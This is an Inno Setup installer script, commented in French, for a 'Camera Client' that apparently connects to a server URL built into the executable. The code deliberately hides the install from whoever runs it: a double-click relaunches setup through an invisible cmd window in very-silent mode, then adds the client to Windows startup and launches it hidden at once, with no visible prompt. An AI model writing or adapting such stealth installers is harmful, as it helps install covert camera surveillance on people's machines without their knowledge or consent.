; Installateur Windows du client caméra — 100 % silencieux, sans saisie,
; aucune fenêtre visible (ni Setup, ni cmd).
; Nécessite Inno Setup (gratuit) : https://jrsoftware.org/isinfo.php
; Compilation : ISCC packaging\windows\installer.iss
; (le script build_windows.bat le fait automatiquement s'il trouve ISCC,
;  et le workflow GitHub Actions « Build Windows client installer » aussi)
;
; Le résultat, CameraClient-Setup.exe, ne nécessite PAS Python sur la
; machine de l'utilisateur : dist\CameraClient.exe (fabriqué par
; PyInstaller) embarque déjà tout l'interpréteur ET l'URL du serveur
; (voir embedded_config.py, versionné dans le dépôt).
;
; Comportement : un simple double-clic sur CameraClient-Setup.exe
;   - n'affiche AUCUNE fenêtre (relance via cmd.exe en mode masque,
;     qui execute lui-meme l'installateur en /VERYSILENT) ;
;   - installe le client dans le profil de l'utilisateur (pas d'admin requis) ;
;   - active le démarrage automatique avec Windows ;
;   - lance le client immédiatement, en arrière-plan, sans fenêtre.
; Les options /VERYSILENT, /SUPPRESSMSGBOXES, /NORESTART restent acceptées
; pour un déploiement par script ou GPO (dans ce cas, pas de relance via cmd :
; WizardSilent est déjà vrai, donc InitializeSetup ne relance rien).
;
; IMPORTANT : ce script vit dans packaging\windows\, PAS dans build\windows\.
; build\ est l'espace de travail de PyInstaller (il est nettoyé/recréé à
; chaque build avec --clean) : tout fichier qui y vivrait serait supprimé.

#define MyAppName "Camera Client"
#define MyAppVersion "1.0"
#define MyAppExeName "CameraClient.exe"

[Setup]
AppId={{2F2C5B3E-7A1D-4B7A-9B2E-CAMERACLIENT1}}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher=Selon Randriavao
DefaultDirName={autopf}\{#MyAppName}
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableDirPage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
DisableStartupPrompt=yes
CloseApplications=no
PrivilegesRequired=lowest
ArchitecturesInstallIn64BitMode=x64compatible
OutputDir=..\..\releases
OutputBaseFilename=CameraClient-Setup
Compression=lzma
SolidCompression=yes
UninstallDisplayIcon={app}\{#MyAppExeName}

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "..\..\dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
; Démarrage automatique avec la session Windows (toujours activé).
Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Run]
; Lancement immédiat, en arrière-plan, y compris en mode silencieux
; (pas de « skipifsilent », sinon le client ne démarrerait qu'à la prochaine session).
Filename: "{app}\{#MyAppExeName}"; Flags: nowait runhidden runasoriginaluser

[UninstallRun]
Filename: "{sys}\taskkill.exe"; Parameters: "/F /IM {#MyAppExeName}"; Flags: runhidden; RunOnceId: "StopCameraClient"

[UninstallDelete]
Type: filesandordirs; Name: "{localappdata}\CameraClient"

[Code]
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
  CmdLine: String;
begin
  Result := True;
  { Double-clic normal : on ouvre une fenetre cmd MASQUEE (invisible,
    ni au premier plan ni dans la barre des taches) qui execute
    l'installation silencieuse, puis on quitte Setup immediatement.
    Le cmd se ferme tout seul des que l'installation est terminee
    (cmd /C ferme la fenetre a la fin, contrairement a /K). }
  if not WizardSilent then
  begin
    CmdLine := '/C ""' + ExpandConstant('{srcexe}') +
      '" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART"';
    Exec(ExpandConstant('{cmd}'), CmdLine, '', SW_HIDE, ewNoWait, ResultCode);
    Result := False;
  end;
end;

function PrepareToInstall(var NeedsRestart: Boolean): String;
var
  ResultCode: Integer;
begin
  { Mise à jour : arrête l'ancienne instance pour pouvoir remplacer le .exe. }
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM {#MyAppExeName}', '',
       SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := '';
end;